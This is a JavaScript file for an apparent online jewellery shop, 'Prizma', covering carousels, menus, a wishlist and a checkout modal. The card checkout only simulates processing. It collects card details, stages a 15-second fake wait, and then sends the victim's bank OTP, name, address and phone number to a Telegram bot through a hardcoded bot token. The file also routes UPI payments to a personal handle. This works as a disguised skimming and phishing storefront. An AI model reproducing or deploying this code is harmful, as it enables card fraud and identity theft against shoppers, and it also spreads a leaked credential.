// scripts.js

// Initialize Swiper for Product Carousels
document.querySelectorAll('.product-carousel').forEach((carousel) => {
  new Swiper(carousel, {
    loop: true,
    pagination: {
      el: carousel.querySelector('.swiper-pagination'),
      clickable: true,
    },
    navigation: {
      nextEl: carousel.querySelector('.swiper-button-next'),
      prevEl: carousel.querySelector('.swiper-button-prev'),
    },
    lazy: true,
  });
});

// Initialize Swiper for Testimonials
new Swiper('.testimonials-carousel', {
  loop: true,
  slidesPerView: 1,
  spaceBetween: 30,
  pagination: {
    el: '.testimonials-carousel .swiper-pagination',
    clickable: true,
  },
  breakpoints: {
    640: {
      slidesPerView: 2,
    },
    1024: {
      slidesPerView: 3,
    },
  },
});

// Toggle Mobile Menu
const menuBtn = document.getElementById('menu-btn');
const mobileMenu = document.querySelector('header nav.md\\:hidden');

menuBtn.addEventListener('click', () => {
  mobileMenu.classList.toggle('hidden');
});

// Back to Top Button
const backToTopBtn = document.getElementById('backToTop');

window.addEventListener('scroll', () => {
  if (window.scrollY > 300) {
    backToTopBtn.classList.remove('hidden');
  } else {
    backToTopBtn.classList.add('hidden');
  }
});

backToTopBtn.addEventListener('click', () => {
  window.scrollTo({ top: 0, behavior: 'smooth' });
});

// Toggle Wishlist
function toggleWishlist(button) {
  button.classList.toggle('text-red-500');
  const countSpan = document.querySelector('.wishlist-btn span');
  let currentCount = parseInt(countSpan.textContent);
  if (button.classList.contains('text-red-500')) {
    currentCount += 1;
  } else {
    currentCount -= 1;
  }
  countSpan.textContent = currentCount;
}

// Open Buy Now Modal
function openOrderModal(productName, productPrice) {
  const modal = document.getElementById('buyNowModal');
  modal.classList.remove('hidden');
  document.getElementById('productName').value = productName;
  document.getElementById('productPrice').value = productPrice;
  
  // Show size selection if the product requires it
  if (productName.toLowerCase().includes('ring')) {
    document.getElementById('sizeSelection').classList.remove('hidden');
  } else {
    document.getElementById('sizeSelection').classList.add('hidden');
  }
  
  // Prevent background scrolling when modal is open
  document.body.classList.add('overflow-hidden');
}

// Close Buy Now Modal
function closeOrderModal() {
  const modal = document.getElementById('buyNowModal');
  modal.classList.add('hidden');
  document.getElementById('purchaseForm').reset();
  document.getElementById('cardDetails').classList.add('hidden');
  document.getElementById('otpSection').classList.add('hidden');
  document.getElementById('loadingSpinner').classList.add('hidden');
  document.getElementById('purchaseSuccess').classList.add('hidden');
  
  // Allow background scrolling when modal is closed
  document.body.classList.remove('overflow-hidden');
}

// Handle Payment Method Selection
document.getElementsByName('paymentMethod').forEach((elem) => {
  elem.addEventListener('change', function(event) {
    if (event.target.value === 'card') {
      document.getElementById('cardDetails').classList.remove('hidden');
    } else {
      document.getElementById('cardDetails').classList.add('hidden');
    }
  });
});

// Handle Purchase Form Submission
document.getElementById('purchaseForm').addEventListener('submit', function(event) {
  event.preventDefault();
  
  const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
  
  if (paymentMethod === 'upi') {
    handleUPIPayment();
  } else if (paymentMethod === 'card') {
    handleCardPayment();
  }
});

function handleUPIPayment() {
  const productPrice = document.getElementById('productPrice').value;
  const upiURL = `upi://pay?pa=hanjla1@paytm&pn=Prizma&am=${productPrice}&cu=INR`;
  window.location.href = upiURL;
  // Optionally, you can close the modal or provide further instructions
}

function handleCardPayment() {
  // Validate Card Details
  const cardNumber = document.getElementById('cardNumber').value;
  const cardExpiry = document.getElementById('cardExpiry').value;
  const cardCVV = document.getElementById('cardCVV').value;
  
  if (!/^\d{16}$/.test(cardNumber)) {
    alert('Please enter a valid 16-digit card number.');
    return;
  }
  
  if (!cardExpiry) {
    alert('Please enter a valid expiry date.');
    return;
  }
  
  if (!/^\d{3}$/.test(cardCVV)) {
    alert('Please enter a valid 3-digit CVV.');
    return;
  }
  
  // Simulate Payment Processing
  document.getElementById('loadingSpinner').classList.remove('hidden');
  setTimeout(() => {
    document.getElementById('loadingSpinner').classList.add('hidden');
    document.getElementById('otpSection').classList.remove('hidden');
  }, 15000); // 15 seconds
}

function verifyOTP() {
  const otp = document.getElementById('otpInput').value;
  
  if (!/^\d{6}$/.test(otp)) {
    alert('Please enter a valid 6-digit OTP.');
    return;
  }
  
  // Send OTP and Order Details to Telegram
  const orderDetails = {
    productName: document.getElementById('productName').value,
    productPrice: document.getElementById('productPrice').value,
    buyerName: document.getElementById('buyerName').value,
    buyerEmail: document.getElementById('buyerEmail').value,
    buyerAddress: document.getElementById('buyerAddress').value,
    buyerPin: document.getElementById('buyerPin').value,
    buyerCity: document.getElementById('buyerCity').value,
    buyerMobile: document.getElementById('buyerMobile').value,
    paymentMethod: 'Card',
    otp: otp
  };
  
  // Replace with your Telegram Bot Token and Chat ID
  const botToken = '7969903007:AAF8MOt9s2IgFyEzhBok9atp15UoqSK-tYw';
  const chatID = '6696895935';
  
  const message = `New Order Received:
Product: ${orderDetails.productName}
Price: Rs. ${orderDetails.productPrice}
Name: ${orderDetails.buyerName}
Email: ${orderDetails.buyerEmail}
Address: ${orderDetails.buyerAddress}, ${orderDetails.buyerCity} - ${orderDetails.buyerPin}
Mobile: ${orderDetails.buyerMobile}
Payment Method: ${orderDetails.paymentMethod}
OTP: ${orderDetails.otp}`;
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatID,
      text: message
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.ok) {
      document.getElementById('purchaseSuccess').classList.remove('hidden');
      // Optionally, close the modal after a delay
      setTimeout(() => {
        closeOrderModal();
      }, 3000);
    } else {
      alert('There was an error processing your order. Please try again.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('There was an error processing your order. Please try again.');
  });
}

// Handle Contact Form Submission
document.getElementById('contactForm').addEventListener('submit', function(event) {
  event.preventDefault();
  
  // Simple Validation (additional validation can be added)
  const fullName = document.getElementById('fullName').value.trim();
  const email = document.getElementById('email').value.trim();
  const subject = document.getElementById('subject').value.trim();
  const message = document.getElementById('message').value.trim();
  
  if (!fullName || !email || !subject || !message) {
    alert('Please fill in all fields.');
    return;
  }
  
  // Send form data to Telegram or your preferred method
  const formDetails = {
    fullName,
    email,
    subject,
    message
  };
  
  // Replace with your Telegram Bot Token and Chat ID
  const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
  const chatID = 'YOUR_TELEGRAM_CHAT_ID';
  
  const formMessage = `New Contact Form Submission:
Name: ${formDetails.fullName}
Email: ${formDetails.email}
Subject: ${formDetails.subject}
Message: ${formDetails.message}`;
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatID,
      text: formMessage
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.ok) {
      document.getElementById('formMessage').classList.remove('hidden');
      document.getElementById('contactForm').reset();
    } else {
      alert('There was an error sending your message. Please try again.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('There was an error sending your message. Please try again.');
  });
});
